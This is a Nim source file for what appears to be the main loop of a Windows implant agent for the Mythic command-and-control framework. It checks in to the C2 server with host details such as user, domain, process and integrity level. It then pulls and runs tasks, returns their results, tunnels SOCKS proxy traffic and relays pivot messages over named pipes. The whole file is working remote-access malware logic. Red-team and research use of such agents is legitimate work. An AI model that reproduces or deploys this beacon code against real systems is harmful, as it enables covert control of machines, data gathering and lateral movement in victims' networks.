import json
import utils
import structs
import std/os
import random
import strutils
import std/tables
import std/deques
import winim/lean
import std/options
import taskQueue
import socks/socks
import pivot/pivot

import config

when defined(PROFILE_SMB):
  import profiles/smb as profile
else:
  import profiles/http as profile


var
  socksActive: bool = false # track the state of the socks connection
  socksMessages*: Deque[SocksMsg] = initDeque[SocksMsg]()
  delegateMessages* = newSeq[DelegateMsg]()



#[
  This function is for the sleep
  of the agent + calculating the
  jitter time in

  Jitter = time + random(time * Jitter%)
]#
proc sleepAgent*() =
  var jitter = int(float(agent.sleepTimeMS)  * (agent.jitterPer / 100))
  var sleepTime = agent.sleepTimeMS + rand(jitter)
  sleep(sleepTime)



#[
  The first request to the C2 server,
  checking the agent in.
]#
proc checkIn*(): bool =

  let checkInData = %* AgentCheckInData(
    action: "checkin",
    ip: getLocalIP(),
    os: "Windows 10",
    user: getUser(),
    host: getHost(),
    pid: getPID(),
    uuid: agent.uuid,
    architecture: getArchitecture(GetCurrentProcess()),
    process_name: getProcessName(),
    domain: getDomain(),
    integrity_level: getIntegrityLevel(0)
  )

  let resp = sendAndRetrData(checkInData)

  # only if a valid response is returned
  if resp.isSome:
    let asJson = resp.get()

    if asJson["status"].getStr() == "success":
      agent.isCheckedIn = true
      agent.uuid = $asJson["id"].getStr # set the new callback UUID
      connection.uuid = agent.uuid
      DBG("-> Callback UUID: " & agent.uuid)
      DBG("[+] Checked In")
      return true
    else:
      DBG("[-] Error receiving the Server Response")
      return false



#[
  This functions retrieves the outstanding tasks
  from the C2 and puts them in the processing loop
  in the agent struct
]#
proc getTasking*() =

  DBG("[*] getTasking")

  let tasking = %* GetTasking(
    action: "get_tasking",
    tasking_size: -1,
    #get_delegate_tasks: false,
    delegates: delegateMessages
  )

  # when sending the delegates to the server
  # ensure to clear them out of the queue
  delegateMessages = @[]

  let resp = sendAndRetrData(tasking)
  # only if a valid response is returned
  if resp.isSome:


    let tasking = to(resp.get(), Tasking)

    # Add the tasks to the queue
    for task in tasking.tasks:
      agent.tasksToProcess.add(task)


    # Handle the socks messages, if there are any
    # and place them into  a dequeue
    if tasking.socks.isSome:
      socksActive = true
      var socks = tasking.socks.get()
      for sck in socks:
        # socksMessages is a deque for storing
        # all incoming socks requests
        socksMessages.addLast(sck)

    var
      count = 0
      cIndex = -1

    if tasking.delegates.isSome and len(tasking.delegates.get()) > 0:
      DBG("[*] New Delegation Packet from server")

      var dels = tasking.delegates.get()

      for delMsg in dels:
        # get the correct pipe
        for edge in activePivots.edges:
          if edge.destination == delMsg.uuid:
            if delMsg.mythic_uuid.isSome:
              if delMsg.uuid != delMsg.mythic_uuid.get():
                cIndex = count
                DBG("[*] Mythic uses the new UUID already")

            DBG("[+] Correct Edge found -> sending data to that edge")
            writePipe(edge.metadata.pipeHandle, delMsg.message)
        count += 1

        if cIndex >= 0:
          activePivots.edges[cIndex].destination = delMsg.mythic_uuid.get()

#[
  All commands are processed in the same thread
]#
proc processTaskLocal*(task: Task, callback: pointer, cmdHash: uint64) =

  var resp: seq[TaskResponse]
  let commandExec  = cast[(proc(task: Task): seq[TaskResponse]{.cdecl.})](callback)

  resp = commandExec(task)

  for chunk in resp:
    # add the result to the response queue
    sendResponseQueue.addLast(ResponseQueueItem(taskId: task.id, taskResponse: %*chunk))


#[
  This loops through all the tasks that
  where received from the server and process
  them in a single thread
]#
proc processTasks*() =

  for i in 0..len(agent.tasksToProcess)-1:
    let task = agent.tasksToProcess[i]

    DBG("Received Task")
    DBG("Command: "  & task.command)
    DBG("Parameters: " & task.parameters)

    let cmdHash = djb2(task.command)

    if agent.commands.contains(cmdHash):

      # Make the SingleThreaded version the default version
      # the default way is executing the commands in the same thread
      processTaskLocal(task, agent.commands[cmdHash], cmdHash)


      # if processed, remove from the list
      #agent.tasksToProcess.del(i)

  agent.tasksToProcess = @[]



#[
  Goes through all the available responses
  and sends them to the Mythic Server
]#
proc sendResponses*()  =

  while len(sendResponseQueue) > 0:
    var item = sendResponseQueue.popFirst().taskResponse
    if len(delegateMessages) > 0:
      item["delegates"] = %* delegateMessages
      delegateMessages = @[]
    discard sendAndRetrData(item)

#[
  This function is called on each loop iteration to handle all the
  socks connections and sends/requests the SOCKS data
]#
proc processSocks*() =

  # if socks is not active,
  # just do nothing
  if not socksActive:
    return


  when defined(debug):
    if len(socksMessages) >= 1:
      DBG("[*] Processing incoming SOCKS Message(s)")

  # process the socks messages in the
  while len(socksMessages) >= 1:
    let item = socksMessages.popFirst()
    socks.processDatagram(connection, item)

  # see if there are any active connections
  # read and write data
  processActiveConnections(connection)

#[
  This function is called on each loop iteration to handle all the
  privot connections and sends/requests the required data via the 'delegate' msg
]#
proc processPivot*() =

  # loop all pivot edges and go through the
  # connected named pipes and read the data
  for edge in pivot.activePivots.edges:
    # if the pipeHandle is an invalid handle
    # continue with the next one
    if edge.metadata.pipeHandle  == INVALID_HANDLE_VALUE:
      continue

    DBG("Reading from pipe:")
    var output = readPipe(edge.metadata.pipeHandle)

    if len(output) >= 1:
      # add the delegate message
      var tmpDelMsg = DelegateMsg(message: output, uuid:edge.destination, c2_profile: edge.c2_profile)
      delegateMessages.add(tmpDelMsg)
